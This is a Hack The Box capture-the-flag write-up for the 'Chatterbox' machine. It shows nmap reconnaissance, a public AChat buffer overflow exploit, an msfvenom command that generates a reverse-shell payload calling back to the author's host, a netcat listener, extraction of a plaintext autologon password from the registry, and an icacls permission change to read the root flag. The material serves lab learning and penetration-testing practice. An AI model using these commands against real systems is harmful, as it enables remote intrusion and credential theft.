---
title: 'Chatterbox Writeup'
date: 2018-06-18
thumbnailImagePosition: left
thumbnailImage: /img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png
coverImage: /img/posts/2018/06/chatterbox-writeup/chatterbox-writeup-banner.png
coversize: partial
coverMeta: out
metaAlignment: center
clearReading: true
categories:
- Hackthebox
- CTF
- Writeup
tags:
- hackthebox
- htb
- pentest
- ctf
showTags: false
showPagination: true
showSocial: true
showDate: true
comments: false
summary: "My writeup of the Hack the box Chatterbox."
---

> Never tell everything you know...
-Roger H. Lincoln

A box that warranted a lot of resets and frustrations. Due to the fact that the initial shell was provided with a Buffer Overflow, and crashing the service at the same time.

Connecting with my supplied VPN from HackTheBox[^1], and performing the initial NMAP scan on the box IP: 10.10.10.74
```
root@kali:~/Chatterbox$ nmap -p- -T4 -Pn 10.10.10.74
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 16:57 CEST
Nmap scan report for AChat (10.10.10.74)
Host is up (0.041s latency).
Not shown: 65533 filtered ports
PORT     STATE SERVICE
9255/tcp open  mon
9256/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.36 seconds
```
So that gives us two ports, lets run a more thorough scan on both.
```
root@kali:~/Chatterbox$ nmap -p9255,9256 -sV --version-all 10.10.10.74
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-18 17:05 CEST
Nmap scan report for AChat (10.10.10.74)
Host is up (0.042s latency).

PORT     STATE SERVICE VERSION
9255/tcp open  http    AChat chat system httpd
9256/tcp open  achat   AChat chat system

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.09 seconds
```
Verification of these services can be done with a simple banner grab using netcat
```
root@kali:~/Chatterbox$ nc 10.10.10.74 9255
> GET / HTTP/1.1

HTTP/1.1 204 No Content
Connection: close
Server: AChat
```
Now it serves a HTTP 204 No Content, but the server seems interesting. Reporting as AChat[^2] we can determine (Unless its a fake HTTP Server), that theres some kind of chat server running behind that port.
Using Searchsploit we can quite quickly see if there is some ready made exploit available.
```
root@kali:~/Chatterbox$ searchsploit achat
-------------------------------------------- ----------------------------------
 Exploit Title                              |  Path
                                            | (/usr/share/exploitdb/)
-------------------------------------------- ----------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow  | exploits/windows/remote/36025.py
[..snip..]
-------------------------------------------- ----------------------------------
Shellcodes: No Result
Papers: No Result
```
So there is as I mentioned before a ready made Buffer OverFlow, that could be used.
First of all copy it to the current directory and look into the sourcecode (remember to never run anything without reviewing the sourcecode).
```
root@kali:~/Chatterbox$ searchsploit -m 36025.py
  Exploit: Achat 0.150 beta7 - Remote Buffer Overflow
      URL: https://www.exploit-db.com/exploits/36025/
     Path: /usr/share/exploitdb/exploits/windows/remote/36025.py
File Type: Python script, ASCII text executable, with very long lines, with CRLF line terminators

Copied to: /root/Documents/Documentation/CTF/htb/chatterbox/blog/36025.py
```
The exploit comes with some customization. Namely create your own shellcode to use in the exploit, and as the exploit suggests lets use msfvenom to create a reverse shell.
```
root@kali:~/Chatterbox$ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=4000 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python > shellcode.py
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 774 (iteration=0)
x86/unicode_mixed chosen with final size 774
Payload size: 774 bytes
Final size of python file: 3706 bytes
```
Now LHOST and LPORT are my own, substitute for your IP recieved by HackTheBox. The important part is that the shellcode generated is below 1152 bytes, as that is specified as the largest payload for this exploit. Mine that was generated is 774 bytes, so well below the threshold.
Using a texteditor lets remove the existing 'buf' lines from the exploit and replace with our generated ones.
Now using the exploit, we also need to have a listener before the service is exploited.
```
Exploit:
root@kali:~/Chatterbox$ python 36025.py
---->{P00F}!
root@kali:~/Chatterbox$
```
```
Listener:
root@kali:~/Chatterbox$ nc -lvvp 4000
listening on [any] 4000 ...
connect to [10.10.14.7] from AChat [10.10.10.74] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
chatterbox\alfred
C:\Windows\system32>
```
Cool, has shell, as 'Chatterbox\Alfred'.
```
c:\Users\Alfred\Desktop>dir /Q
Directory of c:\Users\Alfred\Desktop
[..snip..]
12/10/2017  07:50 PM                32 CHATTERBOX\Alfred      user.txt
[..snip..]
c:\Users\Alfred\Desktop>
```
So that takes care of one flag. Lets go for root!
Doing some registry enumeration, which can be automated with scripts like Sherlock.ps1[^3].
We are presented with:
```
c:\Users\Alfred\Desktop>reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon"
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
[..snip..]
    DefaultUserName    REG_SZ    Alfred
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    Welcome1!
[..snip..]
c:\Users\Alfred\Desktop>
```
Got a user and the password, what would the odds be that Alfred uses the same password for the administrator account?
One could use powershell to get a shell as Administrator. But since you also have read access into the Administrator user as Alfred, we can also see if we can change permissions on root.txt using icacls.
```
c:\Users\Administrator>icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
icacls c:\Users\administrator\desktop\root.txt CHATTERBOX\Alfred:(RX)
Invalid parameter "CHATTERBOX\Alfred:(RX)"

c:\Users\Administrator>icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
icacls c:\Users\Administrator\Desktop\root.txt /grant everyone:(f)
processed file: c:\Users\Administrator\Desktop\root.txt
Successfully processed 1 files; Failed processing 0 files

c:\Users\Administrator>type Desktop\root.txt
type Desktop\root.txt
EatSleepPwnRepeat
```


[^1]: [www.hackthebox.eu](www.hackthebox.eu)  
[^2]: [www.sourceforge.net/projects/achat/](https://sourceforge.net/projects/achat/)  
[^3]: [www.github.com/rasta-mouse](https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1)
